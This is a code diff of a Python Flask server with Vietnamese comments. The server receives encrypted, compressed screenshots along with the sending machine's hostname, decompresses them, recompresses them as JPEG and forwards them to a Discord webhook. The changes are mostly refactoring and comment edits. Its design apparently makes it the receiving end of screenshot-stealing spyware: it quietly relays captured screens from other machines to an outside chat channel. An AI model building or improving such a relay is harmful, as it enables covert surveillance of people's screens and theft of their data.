@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify
 import os
 import zlib
 import base64
+import json
 from datetime import datetime
 import requests
 from cryptography.fernet import Fernet
@@ -10,14 +11,16 @@ import threading
 import io
 from PIL import Image
 
-# Load biến môi trường
+# Load biến môi trường (Discord webhook, secret key)
 load_dotenv()
+
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
-FERNET_KEY = os.getenv("FERNET_KEY")
+FERNET_KEY = os.getenv("FERNET_KEY")  # Khóa Fernet 32-byte base64
 
 app = Flask(__name__)
+
 fernet = Fernet(FERNET_KEY)
-session = requests.Session()
+session = requests.Session()  # Tái sử dụng TCP connection
 
 def decrypt_and_decompress(data_base64: str) -> bytes:
     encrypted_data = base64.b64decode(data_base64)
@@ -25,31 +28,29 @@ def decrypt_and_decompress(data_base64: str) -> bytes:
     return zlib.decompress(decrypted)
 
 def optimize_image(img_bytes: bytes) -> bytes:
-    """Chuyển PNG sang JPEG nén, resize nếu cần"""
+    """Chuyển PNG sang JPEG nén và resize nếu quá lớn"""
     with Image.open(io.BytesIO(img_bytes)) as img:
-        # Resize nếu rộng hoặc cao lớn hơn 1280px
+        if img.mode in ("RGBA", "P"):
+            img = img.convert("RGB")
         max_dim = 1280
         if max(img.size) > max_dim:
             img.thumbnail((max_dim, max_dim))
-
-        # Chuyển sang RGB (JPEG không hỗ trợ alpha)
-        if img.mode in ("RGBA", "P"):
-            img = img.convert("RGB")
-
-        output = io.BytesIO()
-        img.save(output, format="JPEG", quality=60, optimize=True)
-        return output.getvalue()
+        buffer = io.BytesIO()
+        img.save(buffer, format="JPEG", quality=60, optimize=True)
+        return buffer.getvalue()
 
 def send_to_discord_memory_async(filename, img_bytes):
     def task():
         files = {"file": (filename, io.BytesIO(img_bytes), "image/jpeg")}
-        data = {"content": f"🖼 Ảnh đã nén: `{filename}`"}
+        data = {"content": f"📷 Ảnh đã nén: `{filename}`"}
         try:
             res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=5)
             print(f"[Discord] Status: {res.status_code}")
         except Exception as e:
             print(f"[!] Lỗi gửi Discord: {e}")
-    threading.Thread(target=task, daemon=True).start()
+
+    thread = threading.Thread(target=task, daemon=True)
+    thread.start()
 
 @app.route("/", methods=["GET"])
 def home():
@@ -62,17 +63,13 @@ def upload():
         sys_info = content["system_info"]
         image_enc = content["screenshot"]
 
-        # Giải mã & giải nén
-        raw_image = decrypt_and_decompress(image_enc)
+        img_data = decrypt_and_decompress(image_enc)
+        img_optimized = optimize_image(img_data)
 
-        # Nén ảnh tối ưu
-        compressed_image = optimize_image(raw_image)
-
-        # Tạo tên file
         filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
 
-        # Gửi về Discord
-        send_to_discord_memory_async(filename, compressed_image)
+        # Gửi file nén lên Discord bất đồng bộ
+        send_to_discord_memory_async(filename, img_optimized)
 
         return jsonify({"status": "success", "filename": filename})
     except Exception as e:
